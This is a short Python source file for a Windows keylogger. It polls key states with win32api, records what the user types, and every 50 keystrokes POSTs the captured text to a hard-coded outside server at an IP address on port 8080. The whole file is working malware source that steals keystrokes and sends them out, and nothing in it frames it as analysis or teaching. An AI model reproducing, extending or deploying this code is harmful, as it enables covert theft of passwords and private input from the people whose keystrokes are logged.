import threading
import time
from win32api import GetKeyState
import requests

text=''
counter=0
state=None
prev_state=None
UPPER=False

VK = {
        	16: 'SHIFT',
        	17: 'CTRL',
		20: 'CAPS_LOCK',
		27: 'ESC',
		32: ' ',#SPACE
        	46: 'DEL',
		48: '0',
		49: '1',
		50: '2',
		51: '3',
		52: '4',
		53: '5',
		54: '6',
		55: '7',
		56: '8',
		57: '9',
		65: 'a',
		66: 'b',
		67: 'c',
		68: 'd',
		69: 'e',
		70: 'f',
		71: 'g',
		72: 'h',
		73: 'i',
		74: 'j',
		75: 'k',
		76: 'l',
		77: 'm',
		78: 'n',
		79: 'o',
		80: 'p',
		81: 'q',
		82: 'r',
		83: 's',
		84: 't',
		85: 'u',
		86: 'v',
		87: 'w',
		88: 'x',
		89: 'y',
		90: 'z',
		96: 'numpad_0',
		97: 'numpad_1',
		98: 'numpad_2',
		99: 'numpad_3',
		100: 'numpad_4',
		101: 'numpad_5',
		102: 'numpad_6',
		103: 'numpad_7',
		104: 'numpad_8',
		105: 'numpad_9',
		186: ';',
		187: '+',
		188: ',',
		189: '-',
		190: '.',
		191: '/',
		192: '`',
		219: '[',
		220: '\\',
		221: ']',
		222: "'",}

def action():
    global text, counter
    requests.post('http://35.208.177.30:8080/keylogger', json={"text": text})
    print('sending')
    text=''
    counter=0

def key_down(key):
    global UPPER, prev_state,state
    if state!=None:
	    prev_state=state
    state = GetKeyState(key)
    #print(state)

    if (state == -127 and prev_state in (0,1)) or (state == -128 and prev_state in (0,1)):
        if key == 20 and UPPER == False:
            UPPER = True
        elif key == 20 and UPPER == True:
            UPPER = False
        return True
    else:
        return False

def write_key(key):
    global text, counter
    if key=="spacebar":
        key=" "
    if UPPER:
        text += str(key).upper()
    else:
        text += str(key)
    counter += 1
    time.sleep(0.2)
    print(text)


def logger():
    while True:
        for i in VK.keys():
            if key_down(i):
                write_key(VK[i])

        if counter==50:
            action()

threading.Thread(target=logger).start()
